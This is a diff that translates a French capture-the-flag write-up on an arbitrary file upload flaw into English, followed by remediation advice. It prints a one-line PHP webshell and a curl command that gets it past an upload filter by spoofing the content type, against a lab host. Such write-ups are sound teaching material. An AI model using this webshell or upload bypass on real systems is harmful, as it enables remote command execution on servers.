@@ -1,48 +1,53 @@
-# Write up Arbitrary File Upload
+## Exploration
 
-# Exploration
+During our research, we discovered a file upload functionality on the `upload` page. An insecure
+file upload can have severe consequences for a web application if not properly implemented, with a
+critical one being remote command execution.
 
-Nous avons trouvé une fonctionnalité d’upload de fichier durant nos recherches, sur la page **upload.** Un upload de fichier mal sécurisé peut vite avoir un fort impact sur une application web si il est mal implémenté, le cas critique étant une execution de commandes à distance.
+We attempted to perform a basic file upload using an image called `fleur.jpg`:
 
-Nous avons testé le workflow basique d’upload en essayant d’ajouter une simple image, **fleur.jpg**:
+![Screenshot 2024-05-01 at 7.20.09 PM.png](images/Capture_decran_2024-05-01_a_19.20.09.png)
 
-![Capture d’écran 2024-05-01 à 19.20.09.png](images/Capture_decran_2024-05-01_a_19.20.09.png)
+The file seems to be saved on the server, under the path `/tmp/fleur.jpg`
 
-Le fichier semble être sauvegardé sur le serveur, sur le chemin **/tmp/fleur.jpg**
+## Exploitation
 
-# Exploitation
+We then tried uploading a PHP [webshell](https://fr.wikipedia.org/wiki/Backdoor_(computing)),
+since the app is in PHP:
 
-Nous avons ensuite essayé d’upload un [webshell](https://fr.wikipedia.org/wiki/Code_encoquill%C3%A9) PHP, étant donné que l’app est en PHP:
-
-```jsx
+```bash
 ~ echo '<?php system($_GET["cmd"])?>' >> webshell.php
 ```
 
-Malheureusement, il semble qu’il y ait des protections, est nous n’avons pas réussi à upload ce fichier, surement du à son extension:
+Unfortunately, it appears that there are protections, and we were unable to upload this file due
+to its extension:
 
-![Capture d’écran 2024-05-01 à 19.27.29.png](images/Capture_decran_2024-05-01_a_19.27.29.png)
+![Screenshot 2024-05-01 at 7.27.29 PM.png](images/Capture_decran_2024-05-01_a_19.27.29.png)
 
-Nous avons aussi essayé de modifier le nom du fichier avec, par exemple, **webshell.jpg.php**, au cas où il y ai un regex mal configuré, attendant **.jpg** dans le nom du fichier, mais cela n’a pas non plus fonctionné.
+We also attempted to modify the file name, for instance with `webshell.jpg.php`, in case there was
+a poorly configured regex expecting `.jpg` in the filename, but this did not work either.
 
-Nous avons en revanche réussi à upload ce fichier en modifiant le content type de ce fichier avec **image/jpeg**:
+However, we were successful in uploading this file by modifying its content type as `image/jpeg`:
 
-```jsx
-curl -X POST 'http://192.168.64.36/index.php?page=upload' --form 'MAX_FILE_SIZE=100000' --form 'uploaded=@webshell.php;filename=webshell.php;type=image/jpeg' --form 'Upload=Upload' | grep flag
+```bash
+curl -X POST 'http://192.168.64.36/index.php?page=upload' --form 'MAX_FILE_SIZE=100000' --form
+'uploaded=@webshell.php;filename=webshell.php;type=image/jpeg' --form 'Upload=Upload' | grep flag
 [... TRUNCATED DATA ...]
 The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
 [... TRUNCATED DATA ...]
-/tmp/webshell.php succesfully uploaded.
+/tmp/webshell.php uploaded successfully.
 ```
 
-Et nous avons donc récupéré le flag.
+And we obtained the flag.
 
-# Remédiation
+## Remediation
 
-Un arbitrary file upload réussi peut mener dans le pire cas à une execution de commande sur le serveur à distance.
+A successful arbitrary file upload can lead to the worst-case scenario: remote command execution
+on the server.
 
-Voici différentes idées à mettre en place pour pallier à cette vulnérabilité:
+Here are some possible countermeasures for this vulnerability:
 
-- Valider l’extension des fichiers, en implémentant une whitelist des extensions autorisées
-- Analyser le MIME type, et implémenter une whitelist en concordance avec les extensions autorisées
-- Renommer le fichier télécharger en utilisant un UUID
-- Stocker les fichiers sur un serveur dédié, en dehors de l’application web
+- Validate file extensions by implementing a whitelist of allowed extensions
+- Analyze the MIME type and implement a corresponding whitelist
+- Rename the downloaded file using a UUID
+- Store files on a dedicated server, outside of the web application.
